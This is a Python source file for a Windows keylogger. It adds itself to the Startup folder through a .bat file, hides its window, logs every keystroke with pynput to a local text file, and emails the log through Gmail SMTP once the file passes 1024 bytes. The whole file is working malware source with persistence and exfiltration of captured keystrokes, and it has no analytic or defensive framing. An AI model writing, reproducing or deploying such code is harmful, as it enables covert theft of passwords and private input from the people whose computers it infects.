import pynput
from tkinter import Tk
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import getpass

USER_NAME = getpass.getuser()


def add_to_startup(file_path=""):
    if not os.path.exists(r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat' % USER_NAME):
        if file_path == "":
            file_path = os.path.realpath("warning_malware.exe")
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)


def sendMessage(text):
    fromaddr = "somemail@gmail.com"
    toaddr = "somemail@gmail.com"
    mypass = 12345678
 
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = text
 
    body = "Клавіатура"
    msg.attach(MIMEText(body, 'plain'))
 
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, mypass)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def getLang():
    u = ctypes.windll.LoadLibrary("user32.dll")
    pf = getattr(u, "GetKeyboardLayout")
    if hex(pf(0)) == "0x4090409":
        return "<ENG>"
    elif hex(pf(0)) == "0x4190419":
        return "<RUS>"
    elif hex(pf(0)) == "-0xf57fbde":
        return "<UA>"

def check():
    try:
        s = os.stat("pythonkeyboard.txt").st_size
        print(s)
        r = open("pythonkeyboard.txt")
        read = r.read()
        r.close()
        if s == None:
            s = 0
            return s
        if s > 1024:
            sendMessage(read)
            w = open("pythonkeyboard.txt", "w").close()
            s = 0
        return s
    except:
        pass


def writing(a):
    global s
    if s == None:
        s = 0
    if s > 1024:
        s = check()
    if a == "Key.space":
        a = " "
        s += 1
    elif a == "Key.backspace":
        a = "<-1>"
        s += 4
    elif a == "Key.delete":
        a = "<+1>"
        s += 4
    elif a in ["Key.ctrl_l", "Key.ctrl_r", "Key.alt_l", "Key.alt_r", "Key.shift"]:
        a = ""
    elif a == "Key.enter":
        a = "<e>"
        s += 3
    elif a.startswith("Key.f"):
        a = "<{0}>".format(a[4:])
        s += 2
    elif a in ["Key.up", "Key.down", "Key.left", "Key.right"]:
        a = ""
    else:
        s += 1
    try:
        r = open("pythonkeyboard.txt")
        R = r.read()
        r.close()
        w = open("pythonkeyboard.txt", "w")
        w.write(R + a)
        w.close()
        print(R + a)
    except FileNotFoundError:
        w = open("pythonkeyboard.txt", "w")
        w.write(a)
        w.close()
        
def on_press(key):
    global a
    try:
        a = key.char
        writing(a)
    except AttributeError:
        a = key
        writing(str(a))


if __name__ == "__main__":
    add_to_startup()
    s = check()
    a = ""
    t = Tk()
    t.state("withdraw")
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        t.mainloop()
        listener.join()
